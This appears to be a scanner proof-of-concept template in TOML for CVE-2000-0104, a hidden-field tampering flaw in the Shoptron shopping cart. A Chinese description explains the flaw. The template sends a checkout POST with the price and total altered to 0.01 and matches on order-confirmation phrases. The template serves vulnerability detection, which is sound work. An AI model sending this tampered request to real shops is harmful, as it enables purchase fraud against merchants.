[info]
author = "ave"
description = "Shoptron 购物车系统未对隐藏表单字段做服务端完整性校验。攻击者可拦截 HTTP POST 请求并修改 hidden 类型字段（如 price、total、discount 等敏感购买信息），实现对订单数据的未授权篡改。PoC 发送含篡改金额的 POST 请求，验证服务端是否接受未经验证的隐藏字段修改。"
id = "POC-AVE-2000-0089"
name = "Shoptron Shopping Cart Hidden Form Field Tampering PoC"
severity = "high"
tags = ["ave-2000-0089"]
vuln_id = [
    "CVE-2000-0104",
    "AVE-2000-0089",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/checkout.cgi"
protocol = "http"

[poc.requests.body]
content = "item=1&quantity=1&price=0.01&total=0.01&submit=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Thank you",
    "Order Complete",
    "Your order has been",
    "confirmation number",
    "order number",
]
